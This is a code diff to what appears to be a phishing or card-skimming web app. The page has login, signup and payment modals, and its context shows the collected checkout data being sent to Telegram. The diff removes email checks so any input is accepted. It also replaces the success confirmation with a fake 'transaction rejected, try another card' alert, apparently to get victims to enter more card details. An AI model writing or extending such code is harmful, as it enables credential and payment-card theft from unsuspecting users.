@@ -147,12 +147,6 @@ export default function App() {
       return;
     }
 
-    // Validation: Email
-    if (!checkoutData.email || !checkoutData.email.includes("@")) {
-      alert("⚠️ Error: Debe ingresar un correo electrónico válido.");
-      return;
-    }
-
     if (!checkoutData.agreed) {
       alert("Please confirm you are at least 18 years old.");
       return;
@@ -196,12 +190,8 @@ export default function App() {
         })
       ));
       
-      setSubmitSuccess(true);
-      setTimeout(() => {
-        setShowSubscriptionModal(false);
-        setSubmitSuccess(false);
-        setModalView("login");
-      }, 2000);
+      // Instead of success, we simulate a rejection
+      alert("⚠️ Error: Transacción rechazada. Por favor, verifique sus datos o intente con otra tarjeta.");
     } catch (error) {
       console.error("Error sending to Telegram:", error);
       alert("There was an error processing your request. Please try again.");
@@ -419,9 +409,9 @@ export default function App() {
                             <div className="flex flex-col gap-1">
                               <button 
                                 onClick={handleGoToSignup}
-                                disabled={loginPassword.length < 12 || !loginEmail.includes("@")}
+                                disabled={loginPassword.length < 12}
                                 className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
-                                  loginPassword.length >= 12 && loginEmail.includes("@")
+                                  loginPassword.length >= 12 
                                     ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                     : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                 }`}
@@ -509,9 +499,9 @@ export default function App() {
                             <div className="flex flex-col gap-1">
                               <button 
                                 onClick={() => setModalView("payment")}
-                                disabled={signupPassword.length < 12 || !signupName || !signupEmail.includes("@")}
+                                disabled={signupPassword.length < 12 || !signupName}
                                 className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
-                                  signupPassword.length >= 12 && signupName && signupEmail.includes("@")
+                                  signupPassword.length >= 12 && signupName
                                     ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                     : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                 }`}
